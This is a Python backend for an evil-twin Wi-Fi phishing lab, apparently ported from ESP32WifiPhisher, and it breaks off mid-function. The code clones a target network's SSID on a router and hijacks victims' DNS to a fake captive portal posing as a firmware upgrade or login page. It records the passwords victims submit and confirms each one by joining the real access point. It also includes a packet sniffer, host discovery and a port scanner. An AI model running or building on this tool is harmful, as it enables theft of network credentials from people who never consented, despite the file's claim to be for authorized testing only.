#!/usr/bin/env python3
"""MW325R Hack Lab backend — the ESP32WifiPhisher stack, ported to PC+router.

No ESP32 needed: this PC is the brain, your MW325R is the radio.

What runs here (all real):
  - Captive portal HTTP server (original ESP32WifiPhisher pages from ./portal)
  - Captive-detect 302 hijack (iPhone/Android/Windows/Ubuntu probe URLs)
  - DNS responder: every victim query -> this PC (classic captive redirect)
  - WebSocket /ws speaking the EXACT ESP32 JSON API (cmds 0..32), so the
    original admin.html console runs against this backend unmodified
  - Evil Twin engine: snapshots your router WiFi config, broadcasts the twin
    SSID on the router, routes victims here (DHCP+DNS+NAT via the router)
  - Password verify: submitted portal passwords are really tested against the
    target AP by joining it with the router's WDS (block 32 apc) and polling
    `wlan wdsstatus` — status 5 (connected) = the key was CORRECT
  - Host discovery (real ARP sweep + mDNS + SSDP), port scanner (real TCP),
    LAN packet sniffer (real tcpdump, streamed as ESP32-style 'packet' msgs),
    synthetic handshake pcap builder (same structure as the ESP32 firmware),
    BLE sniffer/spam via bluetoothctl when an adapter exists

Control API: http://127.0.0.1:8101/api/* (localhost only, like router_api)
Portal/DNS:  bind on the LAN (victims must reach them). Unprivileged fallback
             ports are used when 80/53 are not allowed; run with sudo for the
             classic captive-portal ports.

Password handling: router admin password in RAM only (shared with router_api
via its module state). Captured portal passwords stay in RAM unless you pass
--cred-file. Own-device / authorized testing only.
"""
import argparse
import asyncio
import base64
import hashlib
import json
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import router_api as R          # shares login state + TDDP helpers
import websockets               # for the /ws admin API

# ---------------------------------------------------------------- state ----
LAB = {
    "authed": False,
    "running": False,
    "target": {},            # {ssid,bssid,channel,auth}
    "scheme": "fwupgrade",   # portal scheme: fwupgrade|netmng|oauth|admin
    "verify": True,          # test submitted passwords against real AP (WDS)
    "portal_port": 0,
    "dns_port": 0,
    "http_ip": "",
    "started": 0,
    "last_wifi": {"ssid": "", "password": ""},
    "verify_last": {"password": "", "ok": None, "ts": 0, "detail": ""},
    "creds": [],             # [{ts,mac,ua,password,raw}]
    "joins": [],             # [{ts,mac,name,ip,event}]
    "seen_macs": set(),
    "dns_queries": 0,
    "portal_hits": 0,
    "ap_block": {},          # snapshot of block 33 pre-lab
    "ch32": None,            # snapshot of block 32 uChannel
    "dhcp8": {},             # snapshot of block 8
    "events": [],            # [{ts,level,msg}] ring buffer
}
LOCK = threading.Lock()
SNIFF = {"proc": None, "on": False, "sent": 0, "drop": 0}
BLE = {"scan_on": False, "devices": {}}
FAKEAP = {"on": False}       # deauther-equivalent (channel squat) flag

MAX_EV = 300
def ev(level, msg):
    with LOCK:
        LAB["events"].append({"ts": time.time(), "level": level, "msg": msg})
        del LAB["events"][:-MAX_EV]

def now():
    return time.strftime("%H:%M:%S")

# ------------------------------------------------------------- helpers ----
def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()

def mac_norm(mac):
    return re.sub(r"[^0-9A-Fa-f]", "", (mac or "")).upper()

OUI = {
    "38-6B-1C": "Mercusys/TP-Link", "AC-84-C6": "TP-Link", "50-C7-BF": "TP-Link",
    "F4-F2-6D": "TP-Link", "C0-06-C3": "TP-Link", "A4-2B-B0": "TP-Link",
    "00-1A-2B": "Ayecom", "18-D6-C7": "TP-Link", "14-CC-20": "TP-Link",
    "00-50-56": "VMware", "00-0C-29": "VMware", "52-54-00": "QEMU/KVM",
    "08-00-27": "VirtualBox", "B8-27-EB": "Raspberry Pi", "DC-A6-32": "Raspberry Pi",
    "E4-5F-01": "Raspberry Pi", "3C-22-FB": "Apple", "F0-18-98": "Apple",
    "AC-DE-48": "Apple", "00-17-88": "Philips Hue", "84-18-88": "Intel",
    "9C-B6-D0": "Intel", "A0-88-69": "Intel", "40-B0-FA": "Samsung",
    "84-25-DB": "Xiaomi", "64-09-80": "Xiaomi", "C8-0F-10": "Xiaomi",
    "BC-DD-C7": "Amazon", "44-65-0D": "Amazon", "F0-9F-C2": "Ubiquiti",
    "24-5A-4C": "Ubiquiti", "74-AC-B9": "Asus", "AC-9E-17": "Asus",
    "34-4B-50": "Asus", "D8-07-B6": "Asus", "00-1D-7E": "Cisco",
    "70-56-9D": "Sagemcom", "E4-9E-12": "Sagemcom", "84-D3-8B": "Sagemcom",
}
def vendor_of(mac):
    m = mac_norm(mac)
    p = "-".join(m[i:i+2] for i in (0, 2, 4, 6, 8, 10))[:8]
    return OUI.get(p, "Unknown vendor")

AUTHSTR = {0: "OPEN", 1: "WEP", 2: "WPA_PSK", 3: "WPA2_PSK",
           4: "WPA_WPA2_PSK", 5: "WPA2_ENTERPRISE", 6: "WPA3_PSK",
           7: "WPA2_WPA3_PSK", 8: "WAPI_PSK"}

def ap_list():
    """Router site survey (real scan) -> ESP32-style list."""
    r = R.do_scan()
    out = []
    if r.get("ok"):
        for a in r.get("aps", []):
            ch = int(a.get("channel") or 0)
            au = int(a.get("auth") or 0)
            out.append({"ssid": a.get("ssid") or "", "signal": int(a.get("rssi") or -100),
                        "channel": ch, "bssid": (a.get("bssid") or "").replace("-", ":").upper(),
                        "authmode": AUTHSTR.get(au, "OPEN"), "authmode_code": au,
                        "pairwise_cipher": 3 if au >= 2 else 0,
                        "group_cipher": 3 if au >= 2 else 0,
                        "wps": "?"})
    return out

def stations():
    """Router-attached stations + dhcp leases (block 13 / block 9)."""
    sta, leases = [], []
    try:
        b13 = R.read_block(13)
        if b13.get("ok"):
            sta = b13["block"].get("list", []) or []
    except Exception:
        pass
    try:
        b9 = R.read_block(9)
        if b9.get("ok"):
            leases = [e for e in (b9["block"].get("list", []) or [])
                      if e.get("ip") and e.get("ip") != "0.0.0.0"]
    except Exception:
        pass
    return sta, leases

def poll_events():
    """Diff stations/leases -> joins/leaves into LAB['joins']."""
    sta, leases = stations()
    nowset = set()
    by = {}
    for e in leases:
        m = mac_norm(e.get("mac"))
        if m:
            nowset.add(m)
            by[m] = e
    for e in sta:
        m = mac_norm(e.get("mac"))
        if m and m != "000000000000":
            nowset.add(m)
            by.setdefault(m, e)
    with LOCK:
        known = LAB["seen_macs"]
        for m in nowset - known:
            e = by[m]
            LAB["joins"].insert(0, {"ts": now(), "mac": fmt_mac(m),
                                    "name": e.get("hostName") or e.get("name") or "(unnamed)",
                                    "ip": e.get("ip") or "?", "event": "join"})
            ev("info", f"station joined: {fmt_mac(m)} ({e.get('hostName') or '?'})")
        for m in known - nowset:
            LAB["joins"].insert(0, {"ts": now(), "mac": fmt_mac(m),
                                    "name": "(left)", "ip": "?", "event": "leave"})
        del LAB["joins"][200:]
        LAB["seen_macs"] = nowset
    return len(nowset)

def fmt_mac(m):
    m = mac_norm(m)
    return ":".join(m[i:i+2] for i in range(0, 12, 2)) if len(m) == 12 else (m or "?")

# ------------------------------------------------- evil twin (router) -----
def twin_start(ssid, channel, sec, key, hijack_ip=""):
    """Broadcast the twin on the router (block 33) and pin its channel.
    hijack_ip: when set, victims' DNS points at this PC (captive redirect)."""
    snap33 = R.read_block(33)
    snap32 = R.read_block(32)
    snap8 = R.read_block(8)
    if not (snap33.get("ok") and snap32.get("ok") and snap8.get("ok")):
        return False, "snapshot failed (router auth?)"
    LAB["ap_block"] = snap33["block"]
    LAB["ch32"] = snap32["block"].get("uChannel")
    LAB["dhcp8"] = snap8["block"]
    fields = {"cSsid": ssid[:32], "bBcastSsid": "1", "bEnable": "1",
              "bSecurityEnable": "1" if sec else "0",
              "cPskSecret": key if sec else (LAB["ap_block"].get("cPskSecret") or "")}
    r = R.do_write_fields(33, fields)
    if not r.get("ok"):
        return False, f"block33 write failed: {r}"
    if channel and 1 <= int(channel) <= 13:
        rc = R.do_write_fields(32, {"uChannel": str(int(channel))})
        if not rc.get("ok"):
            ev("warn", f"channel pin failed: {rc}")
    if hijack_ip:
        r8 = R.do_write_fields(8, {"enable": "1",
                                   "gateway": LAB["dhcp8"].get("gateway", "192.168.1.1"),
                                   "dns.0": hijack_ip, "dns.1": "0.0.0.0"})
        ev("info" if r8.get("ok") else "warn",
           f"DNS hijack on: victims resolve everything to {hijack_ip}"
           if r8.get("ok") else f"block8 (dns hijack) write: {r8}")
    return True, "twin live"

def twin_stop():
    ap = LAB.get("ap_block") or {}
    f = {"bBcastSsid": ap.get("bBcastSsid", "1"), "bEnable": ap.get("bEnable", "1")}
    if ap.get("cSsid") is not None:
        f["cSsid"] = ap["cSsid"]
    if ap.get("bSecurityEnable") is not None:
        f["bSecurityEnable"] = ap["bSecurityEnable"]
    if ap.get("cPskSecret") is not None:
        f["cPskSecret"] = ap["cPskSecret"]
    R.do_write_fields(33, f)
    if LAB.get("ch32") is not None:
        R.do_write_fields(32, {"uChannel": str(LAB["ch32"])})
    dh = LAB.get("dhcp8") or {}
    R.do_write_fields(8, {"enable": dh.get("enable", "1"),
                          "gateway": dh.get("gateway", "0.0.0.0"),
                          "dns.0": (dh.get("dns") or ["0.0.0.0"])[0],
                          "dns.1": (dh.get("dns") or ["", "0.0.0.0"])[1]})
    R.do_wds("disconnect")
    return True

# ------------------------------------------- password verify (real WDS) ---
def verify_password(pw):
    """Join the TARGET with the router (WDS apc) and read wdsstatus.
    wdsstatus 5 = associated = the submitted key is the real one."""
    t = LAB["target"]
    if not t.get("ssid"):
        return None, "no target"
    w = R.do_wds("connect", ssid=t["ssid"],
                 bssid=(t.get("bssid", "") or "").replace(":", "-"), key=pw)
    if not w.get("ok"):
        return False, f"wds write failed: {w.get('error')}"
    ok = False
    for _ in range(8):                      # up to ~16 s
        time.sleep(2)
        st = ""
        try:
            raw = R.cdp_eval("JSON.stringify($.instr('wlan wdsstatus'))")
            st = str(json.loads(raw).get("data", "")).strip()
        except Exception:
            st = ""
        if st == "5":
            ok = True
            break
        if st == "0" and _ >= 2:
            break                            # gave up associating
    R.do_wds("disconnect")
    return ok, "wdsstatus=%s" % st

# ----------------------------------------------------- portal HTTP srv ----
PORTAL_DIR = os.path.join(HERE, "portal")
PROBE_URLS = ("/hotspot-detect.html", "/library/test/success.html", "/generate_204",
              "/gen_204", "/connecttest.txt", "/redirect", "/ncsi.txt",
              "/check_network_status.txt", "/canonical.html", "/success.txt")
MIME = {".html": "text/html", ".htm": "text/html", ".js": "application/javascript",
        ".css": "text/css", ".png": "image/png", ".jpg": "image/jpeg",
        ".ico": "image/x-icon", ".json": "application/json",
        ".ttf": "font/ttf", ".woff": "font/woff", ".woff2": "font/woff2",
        ".svg": "image/svg+xml", ".map": "application/json"}
ROOT_HTML = {"fwupgrade": "/fwupgrade/index.html", "netmng": "/netmng/index.html",
             "oauth": "/oauth/login.html", "admin": "/admin.html"}

class PortalHandler(BaseHTTPRequestHandler):
    server_version = "ESP32WebServer/1.0"   # behave like the ESP32
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _redir_portal(self):
        url = f"http://{LAB['http_ip']}:{LAB['portal_port']}/?from=captive"
        self.send_response(302)
        self.send_header("Location", url)
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("Connection", "close")
        self.end_headers()
        with LOCK:
            LAB["portal_hits"] += 1

    def _serve_file(self, path):
        fs = os.path.join(PORTAL_DIR, path.lstrip("/"))
        fs = os.path.normpath(fs)
        if not fs.startswith(PORTAL_DIR) or not os.path.isfile(fs):
            self._redir_portal()            # like the ESP32: unknown -> portal
            return
        ext = os.path.splitext(fs)[1].lower()
        body = open(fs, "rb").read()
        self.send_response(200)
        self.send_header("Content-Type", MIME.get(ext, "application/octet-stream"))
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    # ---- RFC6455 bridge: makes the ORIGINAL ESP32 admin.html work from the
    # portal URL (it hardcodes ws://<host>/ws). Compact subset: text frames,
    # ping/pong, no fragmentation — exactly what admin.html + portals use.
    def _ws_bridge(self):
        key = self.headers.get("Sec-WebSocket-Key", "")
        accept = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()
        self.send_response(101)
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept)
        self.end_headers()
        sock = self.connection
        try:
            sock.settimeout(None)
        except Exception:
            pass
        cli = WSBridgeClient(sock)
        with BRIDGE_LOCK:
            BRIDGE_CLIENTS.append(cli)
        ev("info", "ESP32 admin console connected (ws bridge)")
        try:
            while True:
                op, payload = ws_read_frame(sock)
                if op in (None, 8):
                    break
                if op == 9:                          # ping -> pong
                    ws_send_frame(sock, b"", 10)
                    continue
                if op != 1 or not payload:
                    continue
                try:
                    m = json.loads(payload.decode("utf-8", "replace"))
                    cmd = int(m.get("cmd", -1))
                    rid = int(m.get("req_id", 0))
                except Exception:
                    continue
                resp = handle_cmd(cmd, m, rid)   # sync dispatch, same as :8765
                ws_send_frame(sock, json.dumps(resp).encode(), 1)
        except Exception:
            pass
        finally:
            with BRIDGE_LOCK:
                if cli in BRIDGE_CLIENTS:
                    BRIDGE_CLIENTS.remove(cli)
            try:
                sock.close()
            except Exception:
                pass

    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        u = urlparse(self.path)
        if u.path == "/ws" and "websocket" in (self.headers.get("Upgrade") or "").lower():
            return self._ws_bridge()
        if u.path in PROBE_URLS:
            return self._redir_portal()
        if u.path in ("/", "/index.html"):
            # ?preview=scheme renders that portal without changing lab state
            pv = parse_qs(u.query).get("preview", [""])[0]
            root = ROOT_HTML.get(pv) or ROOT_HTML.get(LAB["scheme"], "/admin.html")
            return self._serve_file(root)
        if u.path == "/lab-hook.js":        # netmng portal: no WS submit of its own
            body = b"/* lab: netmng form posts to /post, handled by server */"
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        return self._serve_file(u.path)

    def do_POST(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(min(ln, 1_000_000)).decode("utf-8", "replace")
        from urllib.parse import parse_qs
        q = parse_qs(raw[:4096])
        pw = (q.get("wfphshr-wpa-password") or q.get("wfphshr-password") or [""])[0]
        mac = self.headers.get("X-Client-MAC", "") or "?"
        ua = self.headers.get("User-Agent", "")[:120]
        if pw:
            capture_password(pw, mac, ua, self.path)
        # netmng expects the SAME page back (form action='/post')
        body = (b"<html><body><p>Connecting...</p>"
                b"<script>setTimeout(function(){location.href='/'},1500)</script>")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

# ---- RFC6455 compact helpers (module level) ----
def recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def ws_read_frame(sock):
    hdr = recvn(sock, 2)
    if not hdr or len(hdr) < 2:
        return None, None
    b2 = hdr[1]
    op = hdr[0] & 0x0F
    masked = b2 & 0x80
    ln = b2 & 0x7F
    if ln == 126:
        ext = recvn(sock, 2)
        if not ext:
            return None, None
        ln = struct.unpack(">H", ext)[0]
    elif ln == 127:
        ext = recvn(sock, 8)
        if not ext:
            return None, None
        ln = struct.unpack(">Q", ext)[0]
    if ln > 1_000_000:
        return None, None
    mask = recvn(sock, 4) if masked else None
    data = recvn(sock, ln) if ln else b""
    if data is None:
        return None, None
    if mask and data:
        data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    return op, data

def ws_send_frame(sock, data, op=1):
    hdr = bytearray([0x80 | op])
    n = len(data)
    if n < 126:
        hdr.append(n)
    elif n < 65536:
        hdr.append(126)
        hdr += struct.pack(">H", n)
    else:
        hdr.append(127)
        hdr += struct.pack(">Q", n)
    with BRIDGE_SOCK_LOCK:
        sock.sendall(bytes(hdr) + data)

class WSBridgeClient:
    def __init__(self, sock):
        self.sock = sock

def ws_bridge_broadcast(obj):
    with BRIDGE_LOCK:
        clients = list(BRIDGE_CLIENTS)
    for cli in clients:
        try:
            ws_send_frame(cli.sock, json.dumps(obj).encode(), 1)
        except Exception:
            with BRIDGE_LOCK:
                if cli in BRIDGE_CLIENTS:
                    BRIDGE_CLIENTS.remove(cli)

BRIDGE_LOCK = threading.Lock()
BRIDGE_SOCK_LOCK = threading.Lock()
BRIDGE_CLIENTS = []

def capture_password(pw, mac, ua, source="ws"):
    with LOCK:
        LAB["creds"].insert(0, {"ts": now(), "mac": mac, "ua": ua,
                                "password": pw, "source": source})
        del LAB["creds"][300:]
    ev("alert", f"PORTAL CREDENTIAL captured from {mac or 'unknown'} (len {len(pw)})")
    try:
        ws_bridge_broadcast({"type": "log", "level": "warn",
                             "msg": f"[passwordMng] captured credential ({len(pw)} chars)"})
    except Exception:
        pass
    if CRED_FILE:
        try:
            with open(CRED_FILE, "a") as f:
                f.write(json.dumps({"ts": now(), "mac": mac, "password": pw}) + "\n")
        except Exception:
            pass

def free_port(preferred, fam=socket.SOCK_STREAM):
    for p in (preferred, preferred + 1, preferred + 2, 0):
        try:
            s = socket.socket(socket.AF_INET, fam)
            s.bind(("0.0.0.0", p))
            port = s.getsockname()[1]
            s.close()
            return port
        except OSError:
            continue
    return preferred

def start_portal(port):
    srv = ThreadingHTTPServer(("0.0.0.0", port), PortalHandler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv

# ------------------------------------------------------- DNS responder ----
def dns_loop(port):
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sk.bind(("0.0.0.0", port))
    except OSError as e:
        ev("warn", f"DNS bind :{port} failed ({e}) — captive DNS off")
        return
    ev("info", f"DNS responder on :{port} -> {LAB['http_ip']}")
    while True:
        try:
            data, addr = sk.recvfrom(1500)
            LAB["dns_queries"] += 1
            if len(data) < 12:
                continue
            tid = data[:2]
            # echo the question, answer all with our IP
            resp = tid + b"\x85\x80" + data[4:6] + struct.pack(">HHHH", 1, 0, 0, 0) + data[12:]
            ip = socket.inet_aton(LAB["http_ip"])
            # one A record: pointer to Q1, type A, class IN, ttl 10, rdlength 4
            resp += b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 10, 4) + ip
            sk.sendto(resp, addr)
        except Exception:
            time.sleep(0.2)

# ------------------------------------------------- LAN sniff (tcpdump) ----
def sniff_loop(iface):
    p = SNIFF["proc"] = subprocess.Popen(
        ["tcpdump", "-i", iface, "-n", "-l", "-e", "-q", "tcp or udp or icmp"],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    SNIFF["on"] = True
    for line in p.stdout:
        if not SNIFF["on"]:
            break
        SNIFF["sent"] += 1
        if SNIFF["sent"] % 20:                  # keep ~5% for the console stream
            continue
        m = re.match(r".*?(\d\d:\d\d:\d\d\.\d+)\s+IP\s+(\S+)\s*[.>]+\s*(\S+):", line)
        src, dst = (m.group(2), m.group(3)) if m else ("?", "?")
        with LOCK:
            PKTQ.append({"type": "packet", "ch": 0, "rssi": 0,
                         "len": len(line), "type_str": "IP",
                         "subtype_str": "LAN", "src": src, "dst": dst,
                         "info": line.strip()[:110]})
            del PKTQ[:-60]
    SNIFF["on"] = False

def sniff_start(iface):
    if SNIFF["on"]:
        return True
    try:
        threading.Thread(target=sniff_loop, args=(iface,), daemon=True).start()
        time.sleep(0.4)
        return SNIFF["on"]
    except Exception as e:
        ev("warn", f"sniffer start failed: {e}")
        return False

def sniff_stop():
    SNIFF["on"] = False
    if SNIFF["proc"]:
        try:
            SNIFF["proc"].terminate()
        except Exception:
            pass
        SNIFF["proc"] = None

# -------------------------------------------------------- host discovery --
def arp_sweep():
    """Real ARP sweep of our /24 via connect()+udp trick + system ARP cache."""
    net = ".".join(lan_ip().split(".")[:3])
    for i in range(1, 255):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.05)
        try:
            s.connect((f"{net}.{i}", 137)); s.close()
        except Exception:
            try: s.close()
            except Exception: pass
    try:
        subprocess.run(["ping", "-b", "-c", "1", "-W", "1", f"{net}.255"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    hosts = {}
    try:
        out = subprocess.run(["ip", "neigh", "show"], capture_output=True, text=True,
                             timeout=10).stdout
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 5 and parts[3] not in ("FAILED", "INCOMPLETE"):
                ip, mac = parts[0], parts[4]
                if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) and re.match(r"^[0-9a-fA-F:]{17}$", mac):
                    hosts[ip] = {"ip": ip, "mac": mac.upper().replace(":", "-"),
                                 "vendor": vendor_of(mac), "hostname": "", "services": []}
    except Exception:
        pass
    return list(hosts.values())

def mdns_probe(hosts):
    try:
        q = b"\x00\x00" + struct.pack(">HHHH", 0, 1, 0, 0)
        q += b"\x09_services\x07_dns-sd\x04_udp\x05local\x00" + struct.pack(">HH", 12, 1)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(q, ("224.0.0.251", 5353))
        end = time.time() + 3
        while time.time() < end:
            try:
                data, addr = s.recvfrom(4000)
                h = hosts.setdefault(addr[0], {"ip": addr[0], "mac": "", "vendor": "",
                                               "hostname": "", "services": []})
                names = re.findall(rb"([\x20-\x7e]{3,})\x00", data)
                if names:
                    nm = names[0].decode(errors="replace")
                    if not h.get("hostname"):
                        h["hostname"] = nm
                    h.setdefault("services", []).append({"source": "mdns", "name": nm})
            except socket.timeout:
                break
        s.close()
    except Exception:
        pass

def ssdp_probe(hosts):
    try:
        msg = ("\r\n".join(["M-SEARCH * HTTP/1.1", "HOST: 239.255.255.250:1900",
                            'MAN: "ssdp:discover"', "MX: 2", "ST: ssdp:all", "", ""])).encode()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(msg, ("239.255.255.250", 1900))
        end = time.time() + 3
        while time.time() < end:
            try:
                data, addr = s.recvfrom(4000)
                loc = ""
                for line in data.decode(errors="replace").splitlines():
                    if line.lower().startswith("location:"):
                        loc = line.split(":", 1)[1].strip()
                h = hosts.setdefault(addr[0], {"ip": addr[0], "mac": "", "vendor": "",
                                               "hostname": "", "services": []})
                h["services"].append({"source": "ssdp", "location": loc})
                if loc:
                    try:
                        xml = urllib.request.urlopen(loc, timeout=2).read(4096).decode(errors="replace")
                        fn = re.search(r"<friendlyName>([^<]+)", xml)
                        mn = re.search(r"<manufacturer>([^<]+)", xml)
                        if fn:
                            h["friendly_name"] = fn.group(1)
                            if not h.get("hostname"):
                                h["hostname"] = fn.group(1)
                        if mn:
                            h["manufacturer"] = mn.group(1)
                    except Exception:
                        pass
            except socket.timeout:
                break
        s.close()
    except Exception:
        pass

def host_discovery(mdns=True, ssdp=True):
    hosts = {h["ip"]: h for h in arp_sweep()}
    if mdns:
        mdns_probe(hosts)
    if ssdp:
        ssdp_probe(hosts)
    return list(hosts.values())

def port_scan(ip, port, timeout=0.8):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        rc = s.connect_ex((ip, port))
        s.close()
        return 1 if rc == 0 else 0
    except Exception:
        return 2

# ------------------------------------------------- handshake pcap synth ---
def build_pcap(ssid, bssid, channel):
    """Same builder philosophy as the ESP32 firmware: beacon + probe req +
    auth frames in a radiotap pcap. Plainly labeled synthetic."""
    pkts = []
    rt = bytes.fromhex("00001200002f4000")[:8].ljust(8, b"\x00")
    def fc(sub, typ=0):
        return struct.pack("<H", (sub << 4) | (typ << 2) | 0x0008)  # not protected
    mac = bytes(int(x, 16) for x in bssid.split(":")) if ":" in bssid else b"\x00" * 6
    bcast = b"\xff" * 6
    # beacon
    body = fc(8) + struct.pack("<H", 0) + bcast + mac + mac + struct.pack("<H", 0x4311)
    body += struct.pack("<H", 0) + b"\x00" + bytes([len(ssid)]) + ssid.encode()
    body += b"\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c" + b"\x03\x01" + bytes([channel or 1])
    body += b"\x30\x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00"
    pkts.append(rt + body)
    # probe request (wildcard)
    body = fc(4) + struct.pack("<H", 0) + bcast + mac + bcast + struct.pack("<H", 0)
    body += b"\x00\x00" + b"\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c"
    pkts.append(rt + body)
    # auth (seq 1)
    body = fc(11) + struct.pack("<H", 0) + mac + mac + mac + struct.pack("<HHH", 0, 1, 0)
    pkts.append(rt + body)
    out = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 127)
    ts = time.time()
    for i, p in enumerate(pkts):
        out += struct.pack("<IIII", int(ts + i), 0, len(p), len(p)) + p
    return out

# -------------------------------------------------------- BLE (optional) --
def ble_start():
    try:
        subprocess.run(["bluetoothctl", "scan", "on"], timeout=3,
                       capture_output=True)
        BLE["scan_on"] = True
        return True
    except Exception:
        return False

def ble_stop():
    try:
        subprocess.run(["bluetoothctl", "scan", "off"], timeout=3, capture_output=True)
    except Exception:
        pass
    BLE["scan_on"] = False

def ble_devices():
    try:
        out = subprocess.run(["bluetoothctl", "devices"], capture_output=True,
                             text=True, timeout=5).stdout
        devs = []
        for line in out.splitlines():
            parts = line.split(maxsplit=3)
            if len(parts) >= 3 and parts[0] == "Device":
                mac, name = parts[1], parts[2] if len(parts) > 2 else ""
                devs.append([mac, 0, name, vendor_of(mac), "classic", "", 1, ""])
        return devs
    except Exception:
        return []

# ----------------------------------------------- ESP32-compatible WS API --
WS_CLIENTS = set()

async def ws_broadcast(obj):
    if not WS_CLIENTS:
        return
    msg = json.dumps(obj)
    dead = set()
    for ws in list(WS_CLIENTS):
        try:
            await ws.send(msg)
        except Exception:
            dead.add(ws)
    WS_CLIENTS.difference_update(dead)

def ws_broadcast_sync(obj):
    try:
        asyncio.get_event_loop().run_until_complete(ws_broadcast(obj))
    except Exception:
        pass

def lab_status_obj():
    n = LAB.get("n_clients", 0)          # refreshed by the periodic poller
    up = int(time.time() - LAB["started"]) if LAB["running"] else 0
    return {
        "uptime": "%02d:%02d:%02d" % (up // 3600, up % 3600 // 60, up % 60),
        "ram": 40, "usb_wifi": False,
        "et_running": LAB["running"], "deauth_running": FAKEAP["on"],
        "karma_running": False, "wifi_connected": False,
        "wifi_sta_ssid": LAB["last_wifi"]["ssid"],
        "ssid": LAB["target"].get("ssid", ""), "ch": int(LAB["target"].get("channel") or 0),
        "rssi": -50, "bssid": LAB["target"].get("bssid", ""),
        "vendor": vendor_of(LAB["target"].get("bssid", "")),
        "auth": AUTHSTR.get(int(LAB["target"].get("auth") or 0), "OPEN"),
        "has_5g": False,
        "n_clients": n, "n_aps": len(_AP_CACHE), "hs_state": 0,
        "tx_sent": SNIFF["sent"], "tx_drop": SNIFF["drop"], "tx_pps": 0,
        "has_ip": True, "ip": lan_ip(), "netmask": "255.255.255.0",
        "gateway": LAB["dhcp8"].get("gateway", ""), "sniffer_on": SNIFF["on"],
        "portal_port": LAB["portal_port"], "dns_port": LAB["dns_port"],
        "creds": len(LAB["creds"]), "dns_queries": LAB["dns_queries"],
        "portal_hits": LAB["portal_hits"],
        "verify_last": dict(LAB["verify_last"]),
    }

_AP_CACHE = []
_AP_TS = 0.0
_KARMA_PROBES = []
PKTQ = []

def handle_cmd(cmd, p, req_id):
    """Dispatch ESP32 admin API command; returns dict response."""
    if cmd == 0:                                    # get_status
        return {"req_id": req_id, "type": "get_status", **lab_status_obj()}

    if cmd == 1:                                    # set_ap_settings
        return {"req_id": req_id, "status": "ok",
                "message": "AP settings managed by lab engine"}

    if cmd == 2:                                    # get_ap_settings
        return {"req_id": req_id, "type": "get_ap_settings",
                "ssid": LAB["target"].get("ssid", "MagicWifi"),
                "password": "", "channel": int(LAB["target"].get("channel") or 6),
                "tx_rate": 3}

    if cmd == 3:                                    # wifi_scan
        global _AP_CACHE, _AP_TS
        if not R._state.get("enc_pwd"):
            return {"req_id": req_id, "status": "error",
                    "message": "Router not authenticated — log in first"}
        if time.time() - _AP_TS > 60:               # 60 s scan cache
            _AP_CACHE = ap_list()
            _AP_TS = time.time()
        return {"req_id": req_id, "type": "scan_result", "data": _AP_CACHE}

    if cmd == 4:                                    # START_EVILTWIN from console
        ssid = p.get("ssid") or LAB["target"].get("ssid")
        ch = p.get("channel") or LAB["target"].get("channel") or 6
        ok, msg = lab_engine_start({"ssid": ssid, "bssid": LAB["target"].get("bssid", ""),
                                    "channel": ch, "auth": LAB["target"].get("auth", 3)},
                                   LAB["scheme"], LAB["verify"])
        return {"req_id": req_id, "status": "ok" if ok else "error", "message": msg}

    if cmd == 5:                                    # STOP_EVILTWIN
        lab_engine_stop()
        return {"req_id": req_id, "status": "ok", "message": "Evil Twin Stopped"}

    if cmd == 6:                                    # portal target info
        t = LAB["target"]
        v = vendor_of(t.get("bssid", ""))
        vendor_file = (v.split("/")[0].split()[0] if v and v != "Unknown vendor" else "Generic")
        return {"req_id": req_id, "type": "eviltwin_target",
                "logo": f"/logo/{vendor_file}.png", "ssid": t.get("ssid", ""),
                "vendor": v or "Generic"}

    if cmd == 7:                                    # CHECK_INPUT_PASSWORD (portal)
        pw = str(p.get("password", ""))
        capture_password(pw, p.get("mac", ""), "portal-ws", "ws")
        if LAB["verify"] and LAB["target"]:
